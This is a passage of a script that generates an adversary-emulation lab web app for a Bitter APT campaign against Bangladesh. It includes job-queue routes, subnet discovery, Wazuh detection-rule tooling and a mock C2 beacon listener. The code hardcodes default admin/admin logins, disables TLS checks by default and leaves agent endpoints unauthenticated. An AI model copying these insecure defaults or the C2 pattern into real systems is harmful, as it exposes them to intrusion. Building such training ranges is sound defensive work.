  const mitre = (rule.mitre || {}).id || [];
  const should = [];
  if (agent.name) should.push({ match: { 'agent.name': agent.name } });
  for (const m of mitre) should.push({ match: { 'rule.mitre.id': m } });
  for (const g of (rule.groups || [])) should.push({ match: { 'rule.groups': g } });
  const query = { bool: { should, minimum_should_match: 1, filter: [{ range: { '@timestamp': { gte: 'now-30m', lte: 'now' } } }] } };
  const res = await new WazuhIndexer().searchAlerts(query, size);
  return (res.hits && res.hits.hits) || [];
}

function summariseChain(events) {
  const chain = [];
  for (const e of events) {
    const s = e._source || {};
    const rule = s.rule || {};
    chain.push({
      ts: s['@timestamp'], rule_id: rule.id, level: rule.level,
      desc: rule.description, mitre: (rule.mitre || {}).id,
      agent: (s.agent || {}).name
    });
  }
  return chain;
}
module.exports = { relatedEvents, summariseChain };
'@

# ============================================================
# src/ws.js
# ============================================================
Write-ProjectFile "src/ws.js" @'
'use strict';
const { WazuhIndexer } = require('./services/indexer');

let alertHub = null;
let wsServer = null;
let seenIds = new Set();

function setAlertHub(hub) { alertHub = hub; }
function setWsServer(s) { wsServer = s; }

async function pumpOnce() {
  if (!alertHub) return;
  const idx = new WazuhIndexer();
  if (!idx.configured()) return;
  if (alertHub.clients.size === 0) return;
  try {
    const res = await idx.recentAlerts(5, 50);
    const hits = (res.hits && res.hits.hits) || [];
    for (const hit of hits) {
      const hid = hit._id;
      if (hid && !seenIds.has(hid)) {
        seenIds.add(hid);
        if (seenIds.size > 5000) seenIds = new Set();
        alertHub.broadcast({ type: 'alert', hit });
      }
    }
  } catch (e) {}
}

function startAlertPump() {
  const interval = Math.max(1, parseInt(process.env.ALERT_POLL_INTERVAL || '3', 10)) * 1000;
  setInterval(pumpOnce, interval);
  console.log(`[bitter-bd/ws] alert pump running every ${interval / 1000}s`);
}
module.exports = { setAlertHub, setWsServer, startAlertPump };
'@

# ============================================================
# src/routes/auth.js
# ============================================================
Write-ProjectFile "src/routes/auth.js" @'
'use strict';
const express = require('express');
const router = express.Router();
const { db } = require('../db');
const { hashPassword, verifyPassword, makeSession } = require('../security');

function ensureDefaultAdmin() {
  const row = db.prepare('SELECT COUNT(*) AS c FROM users').get();
  if (!row || row.c === 0) {
    const stmt = db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)');
    stmt.run('admin', hashPassword('admin'), 'ADMIN');
    stmt.run('analyst', hashPassword('analyst'), 'ANALYST');
    stmt.run('student', hashPassword('student'), 'STUDENT');
    console.log('[bitter-bd/auth] default users created (admin/admin)');
  }
}

router.get('/login', (req, res) => { res.render('login.html', { error: null }); });
router.post('/login', (req, res) => {
  const { username, password } = req.body || {};
  const u = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
  if (!u || !verifyPassword(password, u.password_hash)) {
    return res.render('login.html', { error: 'Invalid credentials' });
  }
  const tok = makeSession(u.username, u.role);
  res.cookie('gb_session', tok, { httpOnly: true, sameSite: 'lax', maxAge: 8 * 3600 * 1000 });
  res.redirect('/');
});
router.get('/logout', (req, res) => { res.clearCookie('gb_session'); res.redirect('/login'); });

module.exports = { router, ensureDefaultAdmin };
'@

# ============================================================
# src/routes/workstations.js  *** UPDATED ***
# ============================================================
Write-ProjectFile "src/routes/workstations.js" @'
'use strict';
const express = require('express');
const crypto = require('crypto');
const router = express.Router();
const { db, utcnow } = require('../db');
const { guard } = require('../security');
const am = require('../services/agent-manager');
const { scanSubnet, scanAll, localSubnet, localSubnets, listInterfaces } = require('../services/discovery');

router.post('/api/agent/register', (req, res) => {
  const ws = am.registerOrUpdate(req.body || {});
  console.log(`[bitter-bd/workstations] register OK  ws=${JSON.stringify(ws.id)}  ip=${JSON.stringify(ws.ip)}  allowed=${!!ws.allowed}`);
  res.json({ ok: true, workstation_id: ws.id, agent_token: ws.agent_token });
});

router.post('/api/agent/heartbeat', (req, res) => {
  am.registerOrUpdate(req.body || {});
  res.json({ ok: true, server_time: utcnow() });
});

router.get('/api/agent/poll', (req, res) => {
  const wid = req.query.workstation_id;
  if (!wid) return res.status(400).json({ detail: 'workstation_id is required' });
  const ws = db.prepare('SELECT * FROM workstations WHERE id = ?').get(wid);
  if (ws) {
    if (!ws.current_stage && ['ONLINE','BUSY','RUNNING'].includes(ws.status)) {
      db.prepare('UPDATE workstations SET status = ? WHERE id = ?').run('READY', wid);
    }
    db.prepare('UPDATE workstations SET last_seen = ? WHERE id = ?').run(utcnow(), wid);
  } else {
    console.log(`[bitter-bd/workstations] poll from UNREGISTERED ws=${JSON.stringify(wid)} (auto-registering)`);
    am.registerOrUpdate({ workstation_id: wid });
  }
  const job = am.dequeue(wid) || null;
  res.json({ job });
});

router.post('/api/agent/result', (req, res) => {
  const p = req.body || {};
  am.recordResult(p.job_id, p);
  const ws = db.prepare('SELECT * FROM workstations WHERE id = ?').get(p.workstation_id);
  if (ws) {
    const terminal = ['COMPLETED','FAILED','STOPPED','REJECTED'].includes(p.status);
    db.prepare('UPDATE workstations SET current_stage = ?, status = ?, last_seen = ? WHERE id = ?')
      .run(terminal ? '' : (p.stage_id || ''), terminal ? 'READY' : 'BUSY', utcnow(), p.workstation_id);
  }
  const run = db.prepare('SELECT * FROM simulation_runs WHERE job_id = ?').get(p.job_id);
  if (run) {
    db.prepare('UPDATE simulation_runs SET status = ?, finished_at = ?, result = ? WHERE id = ?')
      .run(p.status, utcnow(), JSON.stringify(p), run.id);
    console.log(`[bitter-bd/workstations] result OK  job=${p.job_id}  run#${run.id}  status=${p.status}`);
  } else {
    console.log(`[bitter-bd/workstations] result for unknown run  job=${p.job_id}`);
  }
  res.json({ ok: true });
});

router.get('/api/workstations', guard('view'), (req, res) => {
  const rows = db.prepare('SELECT * FROM workstations').all();
  const now = Date.now();
  const items = rows.map((w) => {
    const ls = w.last_seen ? Date.parse(w.last_seen.replace(' ', 'T') + 'Z') : 0;
    const secs = ls ? (now - ls) / 1000 : 9999;
    let live = w.status;
    if (secs > 30 && w.status !== 'BUSY' && w.status !== 'RUNNING') live = 'OFFLINE';
    return {
      id: w.id, hostname: w.hostname || '', ip: w.ip || '', os: w.os || '',
      status: live, wazuh_status: w.wazuh_status || 'UNKNOWN', sysmon_status: w.sysmon_status || 'UNKNOWN',
      current_user: w.current_user || '', current_stage: w.current_stage || '',
      allowed: !!w.allowed, manual: !!w.manual, pending_jobs: am.pendingCount(w.id),
      last_seen: w.last_seen || null, seconds_since_seen: Math.round(secs * 10) / 10
    };
  });
  res.json({ items });
});

router.get('/api/workstations/subnet', guard('view'), async (req, res) => {
  const configured = String(process.env.LAB_SUBNET || '').trim();
  const detected = localSubnet();
  const interfaces = listInterfaces();
  const scannable = localSubnets();
  res.json({ configured, detected, interfaces, scannable, effective: configured || detected });
});

/* ---------------------------------------------------------------
 * DISCOVER  - scans one subnet, a comma-separated list, or (when no
 * subnet is provided and LAB_SUBNET is unset) EVERY local interface.
 * ------------------------------------------------------------------------- */
router.post('/api/workstations/discover', guard('view'), async (req, res) => {
  let subnets = [];
  let source = 'auto';

  if (req.body && req.body.subnet && String(req.body.subnet).trim()) {
    subnets = String(req.body.subnet).split(',').map(s => s.trim()).filter(Boolean);
    source = 'request';
  } else if (String(process.env.LAB_SUBNET || '').trim()) {
    subnets = String(process.env.LAB_SUBNET).split(',').map(s => s.trim()).filter(Boolean);
    source = 'env';
  } else {
    const locals = localSubnets();
    const seen = new Set();
    for (const l of locals) {
      if (!seen.has(l.subnet)) { seen.add(l.subnet); subnets.push(l.subnet); }
    }
    source = 'auto-all-adapters';
  }

  if (subnets.length === 0) {
    return res.status(400).json({
      detail: 'No subnet configured and none auto-detected.',
      interfaces: listInterfaces()
    });
  }

  const registered = {};
  for (const w of db.prepare('SELECT id, ip FROM workstations').all()) {
    if (w.ip) registered[w.ip] = w.id;
  }

  let allHosts = [];
  const errors = [];

  try {
    allHosts = await scanAll(subnets);
  } catch (e) {
    // Fallback to sequential per-subnet scanning if scanAll blew up.
    for (const subnet of subnets) {
      try {
        const hosts = await scanSubnet(subnet);
        for (const h of hosts) allHosts.push(h);
      } catch (e2) { errors.push(`${subnet}: ${e2.message || e2}`); }
    }
  }

  for (const h of allHosts) {
    if (registered[h.ip]) h.registered_id = registered[h.ip];
  }

  console.log(`[bitter-bd/workstations] discover: source=${source} subnets=[${subnets.join(', ')}] found=${allHosts.length}`);

  res.json({
    subnet: subnets.join(', '),
    subnets,
    source,
    interfaces: listInterfaces(),
    hosts: allHosts,
    count: allHosts.length,
    errors: errors.length ? errors : undefined
  });
});

router.post('/api/workstations/add', guard('workstations.manage'), (req, res) => {
  const body = req.body || {};
  const wid = String(body.workstation_id || '').trim();
  if (!wid) return res.status(400).json({ detail: 'workstation_id is required' });
  const existing = db.prepare('SELECT * FROM workstations WHERE id = ?').get(wid);
  if (!existing) {
    db.prepare(`
      INSERT INTO workstations
        (id, hostname, ip, os, agent_token, status, wazuh_status, sysmon_status,
         current_user, current_stage, allowed, manual, created_at, last_seen)
      VALUES (?, ?, ?, ?, ?, 'OFFLINE', 'UNKNOWN', 'UNKNOWN', '', '', 1, 1, ?, ?)
    `).run(wid, body.hostname || wid, body.ip || '', body.os || '', crypto.randomBytes(24).toString('base64url'), utcnow(), utcnow());
    console.log(`[bitter-bd/workstations] manual add  ws=${JSON.stringify(wid)}  ip=${JSON.stringify(body.ip||'')}`);
  } else {
    db.prepare('UPDATE workstations SET hostname = COALESCE(?, hostname), ip = COALESCE(?, ip), os = COALESCE(?, os), manual = 1 WHERE id = ?')
      .run(body.hostname || null, body.ip || null, body.os || null, wid);
    console.log(`[bitter-bd/workstations] manual update  ws=${JSON.stringify(wid)}`);
  }
  am.logActivity(req.user.u, wid, 'ADD_WORKSTATION', '', 'OK');
  res.json({ ok: true, workstation_id: wid });
});

router.delete('/api/workstations/:wid', guard('workstations.manage'), (req, res) => {
  const wid = req.params.wid;
  const r = db.prepare('DELETE FROM workstations WHERE id = ?').run(wid);
  if (r.changes === 0) return res.status(404).json({ detail: 'Not found' });
  am.logActivity(req.user.u, wid, 'DELETE_WORKSTATION', '', 'OK');
  res.json({ ok: true });
});

router.post('/api/workstations/:wid/allow', guard('workstations.manage'), (req, res) => {
  const wid = req.params.wid;
  const allowed = req.body && req.body.allowed !== undefined ? !!req.body.allowed : true;
  const r = db.prepare('UPDATE workstations SET allowed = ? WHERE id = ?').run(allowed ? 1 : 0, wid);
  if (r.changes === 0) return res.status(404).json({ detail: 'Not found' });
  res.json({ ok: true, allowed });
});

module.exports = router;
'@

# ============================================================
# src/routes/simulation.js
# ============================================================
Write-ProjectFile "src/routes/simulation.js" @'
'use strict';
const express = require('express');
const router = express.Router();
const { db, utcnow } = require('../db');
const { guard } = require('../security');
const am = require('../services/agent-manager');
const { STAGES, getStage } = require('../services/stages');

function validateWorkstation(wid) {
  const ws = db.prepare('SELECT * FROM workstations WHERE id = ?').get(wid);
  if (!ws) { const e = new Error(`Workstation '${wid}' is not registered`); e.status = 404; throw e; }
  if (!ws.allowed) { const e = new Error(`Workstation '${wid}' is not in the allow-list`); e.status = 403; throw e; }
  return ws;
}

router.get('/api/simulation/stages', (req, res) => { res.json({ items: STAGES }); });

router.post('/api/simulation/run-stage', guard('run'), async (req, res) => {
  const { workstation_id, stage_id } = req.body || {};
  const stage = getStage(stage_id);
  if (!stage) return res.status(400).json({ detail: `Unknown stage_id: ${stage_id}` });
  try { validateWorkstation(workstation_id); }
  catch (e) { return res.status(e.status || 500).json({ detail: e.message }); }

  const job = am.newJob(workstation_id, stage_id, 'RUN');
  am.enqueue(workstation_id, job);
  console.log(`[bitter-bd/simulation] run-stage  ws=${JSON.stringify(workstation_id)}  stage=${stage_id}  job=${job.job_id}`);

  db.prepare(`INSERT INTO simulation_runs (workstation_id, stage_id, status, job_id, started_at) VALUES (?, ?, 'RUNNING', ?, ?)`)
    .run(workstation_id, stage_id, job.job_id, utcnow());

  const st = db.prepare('SELECT * FROM simulation_stages WHERE workstation_id = ? AND stage_id = ?').get(workstation_id, stage_id);
  if (!st) {
    db.prepare('INSERT INTO simulation_stages (workstation_id, stage_id, status, last_run) VALUES (?, ?, ?, ?)').run(workstation_id, stage_id, 'Running', utcnow());
  } else {
    db.prepare('UPDATE simulation_stages SET status = ?, last_run = ? WHERE id = ?').run('Running', utcnow(), st.id);
  }

  db.prepare('UPDATE workstations SET current_stage = ?, status = ? WHERE id = ?').run(stage_id, 'BUSY', workstation_id);
  am.logActivity(req.user.u, workstation_id, 'RUN_STAGE', stage_id, 'QUEUED');
  res.json({ ok: true, job });
});

router.post('/api/simulation/cleanup-stage', guard('cleanup'), async (req, res) => {
  const { workstation_id, stage_id } = req.body || {};
  const stage = getStage(stage_id);
  if (!stage) return res.status(400).json({ detail: `Unknown stage_id: ${stage_id}` });
  try { validateWorkstation(workstation_id); }
  catch (e) { return res.status(e.status || 500).json({ detail: e.message }); }

  const job = am.newJob(workstation_id, stage_id, 'CLEANUP');
  am.enqueue(workstation_id, job);
  console.log(`[bitter-bd/simulation] cleanup  ws=${JSON.stringify(workstation_id)}  stage=${stage_id}  job=${job.job_id}`);

  const st = db.prepare('SELECT * FROM simulation_stages WHERE workstation_id = ? AND stage_id = ?').get(workstation_id, stage_id);
  if (st) { db.prepare('UPDATE simulation_stages SET status = ?, last_cleanup = ? WHERE id = ?').run('Cleaning', utcnow(), st.id); }

  am.logActivity(req.user.u, workstation_id, 'CLEANUP', stage_id, 'QUEUED');
  res.json({ ok: true, job });
});

router.post('/api/simulation/stop', guard('stop'), async (req, res) => {
  const { workstation_id, stage_id } = req.body || {};
  const job = am.newJob(workstation_id, stage_id || '*', 'STOP');
  am.enqueue(workstation_id, job);
  am.logActivity(req.user.u, workstation_id, 'STOP', stage_id || '*', 'QUEUED');
  res.json({ ok: true, job });
});

router.get('/api/simulation/runs', (req, res) => {
  const wid = req.query.workstation_id || '';
  const limit = Math.max(1, Math.min(1000, parseInt(req.query.limit || '100', 10)));
  let rows;
  if (wid) { rows = db.prepare('SELECT * FROM simulation_runs WHERE workstation_id = ? ORDER BY id DESC LIMIT ?').all(wid, limit); }
  else { rows = db.prepare('SELECT * FROM simulation_runs ORDER BY id DESC LIMIT ?').all(limit); }
  res.json({ items: rows.map(r => ({ id: r.id, workstation_id: r.workstation_id, stage_id: r.stage_id, status: r.status, job_id: r.job_id, started_at: r.started_at, finished_at: r.finished_at })) });
});

router.get('/api/simulation/runs/by-job/:job_id', (req, res) => {
  const r = db.prepare('SELECT * FROM simulation_runs WHERE job_id = ?').get(req.params.job_id);
  if (!r) {
    const cached = am.getResult(req.params.job_id);
    if (cached) return res.json({ status: cached.status, result: cached });
    return res.status(404).json({ detail: 'Run not found' });
  }
  res.json({ id: r.id, workstation_id: r.workstation_id, stage_id: r.stage_id, status: r.status, job_id: r.job_id, started_at: r.started_at, finished_at: r.finished_at, result: r.result ? JSON.parse(r.result) : {} });
});

router.get('/api/simulation/runs/:run_id', (req, res) => {
  const r = db.prepare('SELECT * FROM simulation_runs WHERE id = ?').get(req.params.run_id);
  if (!r) return res.status(404).json({ detail: 'Run not found' });
  res.json({ id: r.id, workstation_id: r.workstation_id, stage_id: r.stage_id, status: r.status, job_id: r.job_id, started_at: r.started_at, finished_at: r.finished_at, result: r.result ? JSON.parse(r.result) : {} });
});

router.get('/api/activity', (req, res) => {
  const rows = db.prepare('SELECT * FROM activity_logs ORDER BY id DESC LIMIT 200').all();
  res.json({ items: rows.map(a => ({ timestamp: a.timestamp, user: a.user, workstation: a.workstation_id, action: a.action, stage: a.stage, result: a.result })) });
});

module.exports = router;
'@

# ============================================================
# src/routes/wazuh.js
# ============================================================
Write-ProjectFile "src/routes/wazuh.js" @'
'use strict';
const express = require('express');
const axios = require('axios');
const https = require('https');
const router = express.Router();
const { guard } = require('../security');
const { WazuhAPI } = require('../services/wazuh-api');
const { WazuhIndexer } = require('../services/indexer');
const { relatedEvents, summariseChain } = require('../services/correlation');

router.get('/api/wazuh/status', guard('view'), async (req, res) => {
  const api = await new WazuhAPI().status();
  const idx = await new WazuhIndexer().status();
  res.json({ server: api, indexer: idx });
});

router.get('/api/wazuh/agents', guard('view'), async (req, res) => { res.json({ items: await new WazuhAPI().agents() }); });

router.get('/api/wazuh/rules', guard('view'), async (req, res) => { res.json({ items: await new WazuhAPI().rules(req.query.search || '') }); });

router.get('/api/wazuh/alerts', guard('view'), async (req, res) => {
  const q = req.query;
  const filters = {
    'agent.name': q.agent || null, 'agent.id': q.host || null, 'rule.id': q.rule_id || null,
    'rule.mitre.id': q.mitre || null, 'rule.groups': q.group || null,
    'data.win.system.eventID': q.event_id || null, 'q': q.q || null
  };
  const levelMin = parseInt(q.level_min || '0', 10);
  if (levelMin) filters.level_min = levelMin;
  filters.time_range = parseInt(q.time_range || '15', 10);
  const size = parseInt(q.size || '50', 10);
  const r = await new WazuhIndexer().hunt(filters, size);
  const hits = (r.hits && r.hits.hits) || [];
  const total = (r.hits && r.hits.total && r.hits.total.value) || 0;
  res.json({ total, items: hits });
});

router.get('/api/wazuh/alerts/:doc_id', guard('view'), async (req, res) => {
  const docId = req.params.doc_id;
  const index = req.query.index || 'wazuh-alerts-*';
  const verify = String(process.env.VERIFY_TLS || '').toLowerCase() === 'true';
  const base = String(process.env.WAZUH_INDEXER_URL || '').replace(/\/+$/, '');
  try {
    const r = await axios.get(`${base}/${index}/_doc/${docId}`, {
      timeout: 10000,
      auth: { username: process.env.WAZUH_INDEXER_USERNAME || '', password: process.env.WAZUH_INDEXER_PASSWORD || '' },
      httpsAgent: new https.Agent({ rejectUnauthorized: verify })
    });
    res.json(r.data);
  } catch (e) { res.status((e.response && e.response.status) || 500).json({ detail: 'Not found' }); }
});

router.get('/api/wazuh/alerts/:doc_id/related', guard('view'), async (req, res) => {
  const docId = req.params.doc_id;
  const index = req.query.index || 'wazuh-alerts-*';
  const verify = String(process.env.VERIFY_TLS || '').toLowerCase() === 'true';
  const base = String(process.env.WAZUH_INDEXER_URL || '').replace(/\/+$/, '');
  try {
    const r = await axios.get(`${base}/${index}/_doc/${docId}`, {
      timeout: 10000,
      auth: { username: process.env.WAZUH_INDEXER_USERNAME || '', password: process.env.WAZUH_INDEXER_PASSWORD || '' },
      httpsAgent: new https.Agent({ rejectUnauthorized: verify })
    });
    const rel = await relatedEvents(r.data);
    res.json({ chain: summariseChain(rel), count: rel.length });
  } catch (e) { res.status((e.response && e.response.status) || 500).json({ detail: 'Not found' }); }
});

router.get('/api/wazuh/timeline', guard('view'), async (req, res) => {
  const minutes = parseInt(req.query.minutes || '30', 10);
  const agent = req.query.agent || '';
  const r = await new WazuhIndexer().hunt({ 'agent.name': agent || null, time_range: minutes }, 200);
  const hits = (r.hits && r.hits.hits) || [];
  res.json({ items: summariseChain(hits) });
});

module.exports = router;
'@

# ============================================================
# src/routes/rules.js
# ============================================================
Write-ProjectFile "src/routes/rules.js" @'
'use strict';
const express = require('express');
const router = express.Router();
const { db, utcnow } = require('../db');
const { guard } = require('../security');
const { WazuhAPI } = require('../services/wazuh-api');
const { STAGE_BY_KEY } = require('../services/stages');
const xml2js = require('xml2js');

const CUSTOM_RULE_MIN = 100000;
const CUSTOM_RULE_MAX = 120000;

async function extractRuleId(xml) {
  try {
    const parsed = await xml2js.parseStringPromise(xml, { explicitArray: false });
    let found = null;
    function walk(node) {
      if (!node || typeof node !== 'object') return;
      if (node.rule && node.rule.$ && node.rule.$.id) { found = node.rule.$.id; return; }
      for (const v of Object.values(node)) walk(v);
    }
    walk(parsed);
    return found;
  } catch (e) { return { error: String(e.message || e) }; }
}

async function validateRuleInternal(xml) {
  let rid;
  try { await xml2js.parseStringPromise(xml); }
  catch (e) { return { ok: false, error: `XML invalid: ${e.message || e}` }; }
  rid = await extractRuleId(xml);
  if (!rid) return { ok: false, error: 'No <rule id=...> element found' };
  if (typeof rid === 'object' && rid.error) return { ok: false, error: rid.error };
  if (!/^\d+$/.test(String(rid))) return { ok: false, error: 'Rule ID must be numeric' };
  const n = parseInt(rid, 10);
  if (n < CUSTOM_RULE_MIN || n > CUSTOM_RULE_MAX) return { ok: false, error: `Custom rule IDs must be in ${CUSTOM_RULE_MIN}-${CUSTOM_RULE_MAX}` };
  const existing = await new WazuhAPI().ruleExists(rid);
  const collision = existing ? 'ALREADY_DEPLOYED' : null;
  return { ok: true, rule_id: String(rid), collision, existing };
}

router.post('/api/wazuh/rules/validate', guard('rules.write'), async (req, res) => {
  const xml = (req.body && req.body.rule_xml) || '';
  res.json(await validateRuleInternal(xml));
});

router.get('/api/wazuh/rules/presets', guard('view'), (req, res) => {
  const out = [];
  for (const [key, s] of Object.entries(STAGE_BY_KEY)) {
    out.push({ stage_id: key, rule_id: s.wazuh_rule_id, description: s.wazuh_description, xml: s.wazuh_rule_xml, mitre: s.mitre_id });
  }
  res.json({ items: out });
});

router.post('/api/wazuh/rules/test', guard('rules.write'), async (req, res) => {
  const log = (req.body && req.body.log) || '';
  res.json(await new WazuhAPI().logtest(log));
});

router.post('/api/wazuh/rules/deploy', guard('rules.deploy'), async (req, res) => {
  const xml = (req.body && req.body.rule_xml) || '';
  const v = await validateRuleInternal(xml);
  if (!v.ok) return res.status(400).json({ detail: v.error });
  if (v.collision === 'ALREADY_DEPLOYED') return res.status(409).json({ detail: 'RULE ID COLLISION' });
  db.prepare(`
    INSERT OR REPLACE INTO wazuh_rule_deployments (rule_id, xml, deployed_at, deployed_by, status)
    VALUES (?, ?, ?, ?, 'PENDING')
  `).run(v.rule_id, xml, utcnow(), req.user.u);
  res.json({ ok: true, status: 'PENDING', rule_id: v.rule_id, next_steps: ['Save XML to /var/ossec/etc/rules/bitter_bangladesh_custom.xml', 'Run: /var/ossec/bin/wazuh-control reload'] });
});

router.get('/api/wazuh/rules/deployments', guard('view'), (req, res) => {
  const rows = db.prepare('SELECT * FROM wazuh_rule_deployments ORDER BY id DESC').all();
  res.json({ items: rows.map(r => ({ rule_id: r.rule_id, status: r.status, deployed_at: r.deployed_at, by: r.deployed_by })) });
});

router.delete('/api/wazuh/rules/:rule_id', guard('rules.deploy'), (req, res) => {
  db.prepare('DELETE FROM wazuh_rule_deployments WHERE rule_id = ?').run(req.params.rule_id);
  res.json({ ok: true });
});

module.exports = router;
'@

# ============================================================
# src/routes/c2.js
# ============================================================
Write-ProjectFile "src/routes/c2.js" @'
'use strict';
const express = require('express');
const router = express.Router();

function log(msg) { console.log('[bitter-bd/c2] ' + msg); }

router.post('/api/c2/beacon', express.raw({ type: '*/*', limit: '200mb' }), (req, res) => {
  const body = req.body || Buffer.alloc(0);
  const len = Buffer.isBuffer(body) ? body.length : (body ? String(body).length : 0);
  const client = req.ip || (req.socket && req.socket.remoteAddress) || '?';
  const ua = req.headers['user-agent'] || '';
  const cookie = req.headers.cookie || '';
  const ct = req.headers['content-type'] || '';
  log(`BANGLADESH BEACON from ${client} bytes=${len} ua=${JSON.stringify(ua.slice(0, 60))} cookie=${JSON.stringify(cookie.slice(0, 60))} ct=${JSON.stringify(ct.slice(0, 40))}`);

  if (Buffer.isBuffer(body)) {
    const bodyStr = body.toString('utf8', 0, Math.min(len, 500));
    if (bodyStr.includes('ZxxZ') || bodyStr.includes('zxxz')) {
      log(`ZxxZ separator detected in BANGLADESH beacon!`);
    }
  }

  res.json({
    status: 'ok',
    next_check: 17,
    task: 'idle',
    session: '5a78785a'
  });
});

router.get('/api/c2/beacon', (req, res) => {
  const client = req.ip || (req.socket && req.socket.remoteAddress) || '?';
  const ua = req.headers['user-agent'] || '';
  log(`BANGLADESH BEACON(GET) from ${client} ua=${JSON.stringify(ua.slice(0, 60))}`);
  res.json({ status: 'ok', next_check: 17 });
});

module.exports = router;
'@

# ============================================================
# views/base.html
# ============================================================
Write-ProjectFile "views/base.html" @'
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>NEXOR CYBERRANGE - BITTER APT | BANGLADESH CAMPAIGN Emulation</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
<header class="topnav">
  <div class="brand"><span class="logo">N</span> NEXOR <span class="sub">CYBERRANGE</span> <span class="sub-bd">| BANGLADESH CAMPAIGN</span></div>
  <nav>
    <a href="#">Dashboard</a>
    <a href="#">Labs</a>
    <a href="#">Campaign</a>
    <a href="#">Tracks</a>
    <a href="#">CTF</a>
    <a href="#">MITRE ATT&amp;CK</a>
    <a href="/" class="active">BITTER APT &mdash; BANGLADESH</a>
  </nav>
  <div class="nav-right">
    <input class="search" placeholder="Search for labs...">
    {% if user %}
      <span class="user">{{ user.u }} <b>{{ user.r }}</b></span>
      <a href="/logout" class="btn-ghost">Logout</a>
    {% endif %}
  </div>
</header>
<main class="main-content">
{% block content %}{% endblock %}
</main>
<footer class="statusbar">
  <span id="sb-wazuh" class="dot red">Wazuh</span>
  <span id="sb-agent" class="dot red">Agent</span>
  <span id="sb-sysmon" class="dot red">Sysmon</span>
  <span id="sb-backend" class="dot green">Backend</span>
  <span id="sb-sim" class="dot grey">Simulation</span>
</footer>
<script src="/static/js/app.js" defer></script>
{% block scripts %}{% endblock %}
</body>
</html>
'@

# ============================================================
# views/login.html
# ============================================================
Write-ProjectFile "views/login.html" @'
{% extends "base.html" %}
{% block content %}
<div class="login-wrap">
  <form class="login-card" method="post" action="/login">
    <h1>NEXOR CYBERRANGE</h1>
    <p class="bd-tag">BANGLADESH CAMPAIGN</p>
    <p class="muted">BITTER APT (T-APT-17 / Hazy Tiger) &mdash; Rapid Action Battalion (RAB) targeting emulation. Authorized lab only.</p>
    {% if error %}<div class="err">{{ error }}</div>{% endif %}
    <label>Username <input name="username" autofocus></label>
    <label>Password <input name="password" type="password"></label>
    <button type="submit">Sign in</button>
    <p class="hint">Default: admin / admin</p>
  </form>
</div>
{% endblock %}
'@

# ============================================================
# views/lab.html
# ============================================================
Write-ProjectFile "views/lab.html" @'
{% extends "base.html" %}
{% block content %}
<div class="crumbs">Home &gt; Labs &gt; BITTER APT &gt; <span class="bd-crumb">BANGLADESH CAMPAIGN</span></div>
<div class="bd-banner">
  <span class="bd-flag-icon">&#127463;&#127465;</span>
  <b>TARGET:</b> BANGLADESH &mdash; Rapid Action Battalion (RAB), Bangladesh Police
  &nbsp;|&nbsp; <b>CAMPAIGN START:</b> August 2021
  &nbsp;|&nbsp; <b>THREAT ACTOR:</b> Bitter APT (T-APT-17 / APT-C-08 / Hazy Tiger)
  &nbsp;|&nbsp; <b>TOOLKIT:</b> ZxxZ Trojan &middot; CVE-2017-11882 &middot; CVE-2018-0798
  &nbsp;|&nbsp; <b>SOURCE:</b> Cisco Talos Threat Intelligence
</div>
<div class="hero">
  <div>
    <h1>BITTER APT <span class="accent">BANGLADESH CAMPAIGN</span></h1>
    <p class="subtitle">Emulates the August 2021+ Bitter APT campaign targeting <b>Bangladesh's Rapid Action Battalion (RAB)</b> &mdash; Equation Editor exploits, ZxxZ trojan, spoofed Pakistani senders, and CDR-themed phishing lures.</p>
  </div>
  <div class="stepper">
    <div class="step done">Build</div>
    <div class="step done">Target BD</div>
    <div class="step active">Emulate</div>
    <div class="step">Detect</div>
    <div class="step">Analyze</div>
  </div>
</div>
{% if demo_mode %}<div class="banner warn">DEMO MODE</div>{% endif %}
<div class="banner danger">AUTHORIZED LAB ENVIRONMENT ONLY &mdash; Dedicated, isolated lab workstations only.</div>

<div class="layout">
  <aside class="col-left panel">
    <h2 class="panel-title">BANGLADESH CAMPAIGN STAGES</h2>
    <div id="stage-list" class="scroll-y">
      {% for s in stages %}
      <div class="stage-card" data-stage="{{ s.key }}">
        <div class="num">{{ s.number }}</div>
        <div class="meta">
          <div class="title">{{ s.name }}</div>
          <div class="desc">{{ s.short }}</div>
        </div>
        <div class="status st-notstarted" data-status-for="{{ s.key }}">o</div>
      </div>
      {% endfor %}
    </div>
  </aside>

  <section class="col-center panel">
    <h2 class="panel-title">BITTER APT &mdash; BANGLADESH EMULATION</h2>
    <div class="sim-header">
      <div><label>TARGET</label><div id="hdr-target">-</div></div>
      <div><label>CURRENT STAGE</label><div id="hdr-stage">-</div></div>
      <div><label>STATUS</label><div id="hdr-status">IDLE</div></div>
    </div>
    <div class="sim-buttons">
      <button id="btn-run" class="primary">RUN STAGE</button>
      <button id="btn-stop" class="danger">STOP</button>
      <button id="btn-cleanup" class="warn">CLEANUP</button>
      <button id="btn-reset" class="ghost">RESET LAB</button>
    </div>
    <div class="tabs">
      <button class="tab active" data-tab="output">EMULATION OUTPUT</button>
      <button class="tab" data-tab="commands">COMMANDS</button>
      <button class="tab" data-tab="telemetry">TELEMETRY</button>
      <button class="tab" data-tab="mitre">MITRE ATT&amp;CK</button>
      <button class="tab" data-tab="activity">ACTIVITY</button>
    </div>
    <div class="tabbody scroll-y">
      <div class="tabpane active" id="pane-output"><pre id="output" class="mono"></pre></div>
      <div class="tabpane" id="pane-commands">
        <div id="command-list" class="cmdlist"></div>
        <pre id="command-detail" class="mono cmddetail"></pre>
      </div>
      <div class="tabpane" id="pane-telemetry">
        <table class="tbl" id="telemetry-tbl"><thead><tr><th>Time</th><th>Kind</th><th>Value</th></tr></thead><tbody></tbody></table>
      </div>
      <div class="tabpane" id="pane-mitre"><div id="mitre-content"></div></div>
      <div class="tabpane" id="pane-activity">
        <table class="tbl" id="activity-tbl"><thead><tr><th>Time</th><th>User</th><th>Action</th><th>Stage</th><th>Result</th></tr></thead><tbody></tbody></table>
      </div>
    </div>
  </section>

  <aside class="col-right panel">
    <h2 class="panel-title">TARGET WORKSTATION</h2>
    <div class="bd-target-card">
      <div class="bd-target-flag">&#127463;&#127465;</div>
      <div>
        <div class="bd-target-title">BANGLADESH</div>
        <div class="bd-target-sub">Rapid Action Battalion (RAB) &middot; Campaign Aug 2021+</div>
      </div>
    </div>
